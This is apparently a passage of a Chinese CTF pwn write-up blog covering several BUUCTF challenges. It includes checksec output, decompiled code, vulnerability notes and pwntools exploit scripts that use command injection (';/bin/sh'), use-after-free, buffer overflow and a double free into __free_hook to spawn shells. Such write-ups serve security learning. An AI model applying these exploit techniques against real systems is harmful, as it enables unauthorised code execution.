<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_router&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_router&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#p.sendline(&#x27;;cat flag&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_ydsneedgrirlfriend"><a class="markdownIt-Anchor" href="#bjdctf_2020_ydsneedgrirlfriend"></a> bjdctf_2020_YDSneedGrirlfriend</h2>
<h3 id="1checksec-18"><a class="markdownIt-Anchor" href="#1checksec-18"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-17"><a class="markdownIt-Anchor" href="#2ida-17"></a> 2.IDA</h3>
<p>基本功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Her name size is :&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Her name is :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>del_girlfriend</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( girlfriendlist[v1] )                   <span class="comment">// UAF</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)girlfriendlist[v1] + <span class="number">1</span>)); <span class="comment">// free(chunk)</span></span><br><span class="line">      <span class="built_in">free</span>(girlfriendlist[v1]);                 <span class="comment">// free(size)</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>释放后指针没有置0，造成 <strong>use after free</strong></p>
</blockquote>
<p><strong>print_girlfriend_name</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">print_girlfriend_name</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>位于所申请的chunk中，可以通过之前的uaf漏洞将其改写</p>
</blockquote>
<p><strong>back_door</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YDS get N+ girlfriend!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>直接覆盖<strong>print_girlfriend_name</strong> 为 <strong>back_door</strong> 就行了</p>
</blockquote>
<h3 id="3exp-15"><a class="markdownIt-Anchor" href="#3exp-15"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Her name size is :&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Her name is :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip,port,mode,debug</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(<span class="string">&quot;bjdctf_2020_YDSneedGrirlfriend&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;27659&quot;</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#ciscn_2019_c_1"></a> ciscn_2019_c_1</h2>
<p>环境：Ubuntu18</p>
<h3 id="1checksec-19"><a class="markdownIt-Anchor" href="#1checksec-19"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-18"><a class="markdownIt-Anchor" href="#2ida-18"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">stdin</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  func(v3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>func</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:0000000000400399	0000000A	C	libc.so.6</span><br><span class="line">LOAD:00000000004003A3	00000005	C	gets</span><br><span class="line">LOAD:00000000004003A8	00000005	C	puts</span><br><span class="line">LOAD:00000000004003AD	00000006	C	stdin</span><br><span class="line">LOAD:00000000004003B3	00000007	C	stdout</span><br><span class="line">LOAD:00000000004003BA	00000007	C	system</span><br><span class="line">LOAD:00000000004003C1	00000008	C	setvbuf</span><br><span class="line">LOAD:00000000004003C9	00000012	C	__libc_start_main</span><br><span class="line">LOAD:00000000004003DB	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:00000000004003EA	0000000C	C	GLIBC_2.2.5</span><br><span class="line">.rodata:00000000004007B4	00000018	C	Let&#x27;s guess the number.</span><br><span class="line">.rodata:00000000004007CC	0000000A	C	cat /flag</span><br><span class="line">.rodata:00000000004007D6	0000001D	C	Its value should be 11.28125</span><br><span class="line">.eh_frame:000000000040089F	00000006	C	;*3$\&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>v1的栈空间覆盖到v2</p>
</blockquote>
<h3 id="3exp-16"><a class="markdownIt-Anchor" href="#3exp-16"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26782</span>)</span><br><span class="line">number_addr = <span class="number">0x41348000</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>) + p64(number_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Let&#x27;s guess the number.\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>number是地址下面保存的16进制值</p>
</blockquote>
<h2 id="ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#ciscn_2019_en_2"></a> ciscn_2019_en_2</h2>
<p>和ciscn_2019_c_1一样</p>
<h2 id="ciscn_2019_en_3"><a class="markdownIt-Anchor" href="#ciscn_2019_en_3"></a> ciscn_2019_en_3</h2>
<h3 id="1checksec-20"><a class="markdownIt-Anchor" href="#1checksec-20"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-19"><a class="markdownIt-Anchor" href="#2ida-19"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the story kingdom.&quot;</span>);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line"> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</span><br><span class="line"> _printf_chk(<span class="number">1LL</span>, (__int64)&amp;buf);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Please input your ID.&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符串格式化漏洞，可以从这里泄露<code>libc base</code></p>
</blockquote>
<p>只有两个有效功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the story kingdom.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</span><br><span class="line">_printf_chk(<span class="number">1LL</span>, &amp;buf);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input your ID.&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">puts</span>(&amp;s);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符串格式化漏洞，<code>printf_chk</code>函数，导致你在使用<code>%a$p</code>时需要同时使用<code>%(1到a)$p</code>才可以，并且<code>禁用了%n</code>，所以利用格式化字符串写的这条路基本被pass掉，只有可能进行一些简单的<code>leak</code></p>
</blockquote>
<p><strong>delete</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">free</span>(qword_202068[<span class="number">2</span> * v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>指针未清0</p>
</blockquote>
<h3 id="3gdb-3"><a class="markdownIt-Anchor" href="#3gdb-3"></a> 3.GDB</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;ID.&#x27;</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&#x27;leak addr =&gt; 0x%x&#x27;</span>,leak)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x7fffa19cf4b0</span> ◂— <span class="number">0x3232323232323232</span> (<span class="string">&#x27;22222222&#x27;</span>)</span><br><span class="line"><span class="number">0x7fffa19cf4b8</span> —▸ <span class="number">0x7fc2db859237</span> (setbuffer+<span class="number">231</span>) ◂— test   dword ptr [rbx], <span class="number">0x8000</span></span><br><span class="line"><span class="number">0x7fffa19cf4c0</span> ◂— <span class="number">0xa616161616161</span> /* <span class="string">&#x27;aaaaaa\n&#x27;</span> */</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>这个时候<code>0x7fffa19cf4b0</code>被填充完全，接着输出就会输出<code>0x7fffa19cf4b8</code>的内容，<code>0x7fffa19cf4b8</code>的内容就是<code>0x7fc2db859237 (setbuffer+231)</code>，所以得出这时的<code>libc_now</code>=<code>0x7fc2db859237 - 231</code>，那么<code>libc base</code> = <code>libc_now - libc.sym[&quot;setbuffer&quot;]</code></p>
</blockquote>
<blockquote>
<p>接着就是填入<code>/bin/sh</code>，改<code>_free_hook</code>为<code>system</code></p>
</blockquote>
</blockquote>
<h3 id="4exp-4"><a class="markdownIt-Anchor" href="#4exp-4"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_en_3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_en_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;27106&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: \n&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: \n&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;ID.&#x27;</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">231</span>-libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line">	free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	log.success(<span class="string">&#x27;libc base =&gt; 0x%x&#x27;</span>,libcbase)</span><br><span class="line">	log.success(<span class="string">&#x27;free hook =&gt; %x&#x27;</span>,free_hook)</span><br><span class="line">	log.success(<span class="string">&#x27;sys addr =&gt; 0x%x&#x27;</span>,system)</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">0</span>) <span class="comment">#double free</span></span><br><span class="line">	add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&#x27;dd&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_es_1"><a class="markdownIt-Anchor" href="#ciscn_2019_es_1"></a> ciscn_2019_es_1</h2>
<h3 id="1checksec-21"><a class="markdownIt-Anchor" href="#1checksec-21"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-20"><a class="markdownIt-Anchor" href="#2ida-20"></a> 2.IDA</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,name,call</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;please input name:&quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;please input compary call:&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span 